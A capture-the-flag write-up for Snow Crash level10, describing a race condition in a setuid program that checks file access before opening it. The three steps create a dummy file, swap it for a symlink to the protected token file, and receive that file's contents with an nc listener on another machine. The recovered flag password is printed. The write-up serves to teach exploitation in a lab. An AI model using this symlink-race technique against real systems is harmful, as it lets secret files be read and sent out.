# Write up

One more time, we have two files : `level10` and `token`
We don't have any access to the token file, and the level10 program takes two argument : a file name and an host ip to send the file
Using `nm -u` on the level10 program let us know that the program use the C socket library.

Same routine, we download it, decompile it and analyse it.
This time, we can see a call to the access function : 
```
if (access(dwArg08->ptr0004, 0x04) == 0x00)
```
- `dwArg08->ptr0004` is `argv[1]`
- `0x04` is the `R_OK` flag (read access, see man chmod and man access)
- `0x00` is returned if the access call succeded
Which means that we need read access in the token file in order to access it

The program is owned by flag10, but the access function use our uid.
The access man let us know that in some case access can be vulnerable to Race Conditions,
And by reading the source code it seems to be one of those cases (open() after access())

We will have to create a file with rights, like `touch /tmp/ok`, then execute `level10`
And while level10 is waiting for the `connect` return, we will have to replace the tmp/ok file by a sim link using `ln -s token /tmp/ok`

With a dummy file containing the "aaa" string, we test the program : `./level10 /tmp/test 192.168.56.1`
We notice that the program try to connect to my address using the port 6969.
I receipt it on my machine : `nc -l 6969`, which make the program to terminate and my machine to display the file contents.
It lets us a very large window to act.

We will process in 3 steps, using 2 shells in the Snow Crash VM and 1 shell on my local machine.

- Step 1 :
```
touch /tmp/lidl;./level10 /tmp/lidl 192.168.56.1
```
In the 1st VM shell, we create the dummy file, we pass the access call and wait for the connection

- Step 2 :
```
rm -f /tmp/lidl;ln -fs ~/token /tmp/lidl
```
In the 2nd VM shell, while the first one is still waiting, we replace the dummy file by a malicious symlink

- Step 3 :
```
nc -l 6969
```
In the local machine, we listen to the port 6969, letting the 1st VM shell pass the connect function and opening the malicious symlink

After few seconds, the flag10 password is displayed on our local machine : `woupa2yuojeeaaed06riuj63c`

## Sources

- man access